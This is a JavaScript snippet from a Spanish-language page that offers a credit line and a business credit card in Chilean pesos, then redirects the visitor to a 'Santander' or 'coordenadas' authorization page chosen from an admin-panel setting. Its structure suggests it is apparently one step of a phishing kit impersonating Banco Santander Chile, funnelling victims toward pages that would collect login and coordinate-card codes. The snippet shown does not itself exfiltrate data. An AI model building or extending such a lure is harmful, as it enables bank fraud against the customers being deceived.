<script>
  // Función para formatear en pesos chilenos sin decimales
  function formatoCLP(valor){
    return new Intl.NumberFormat("es-CL", {
      style: "currency",
      currency: "CLP",
      minimumFractionDigits: 0,
      maximumFractionDigits: 0
    }).format(valor);
  }

  document.addEventListener("DOMContentLoaded", () => {
    const producto1 = localStorage.getItem("producto1") || "Línea de Crédito";
    const monto1 = localStorage.getItem("lineaMonto") || 5000000;
    const producto2 = localStorage.getItem("producto2") || "Tarjeta de Crédito WorldMember Limited Business";
    const monto2 = localStorage.getItem("tarjetaMonto") || monto1;

    document.getElementById("producto1").innerText = producto1;
    document.getElementById("monto1").innerText = formatoCLP(monto1);
    document.getElementById("producto2").innerText = producto2;
    document.getElementById("monto2").innerText = formatoCLP(monto2);
  });

  document.getElementById("quieroBtn").addEventListener("click", function(){
    const seleccion = document.querySelector('input[name="opcion"]:checked');
    if(!seleccion){
      document.getElementById("mensaje").innerText = "⚠️ Debes seleccionar un producto.";
      return;
    }

    // Guardar la opción seleccionada en localStorage
    localStorage.setItem("seleccionProducto", seleccion.value);

    // Verificar tipo de autorización definido en Panel Admin
    const tipoAutorizacion = localStorage.getItem("tipoAutorizacion") || "santander";

    document.getElementById("mensaje").innerText = 
      "Serás redirigido al área de autorización...";

    setTimeout(() => {
      if(tipoAutorizacion === "santander"){
        window.location.href = "autorizacion-santander.html";
      } else {
        window.location.href = "autorizacion-coordenadas.html";
      }
    }, 2000);
  });
</script>
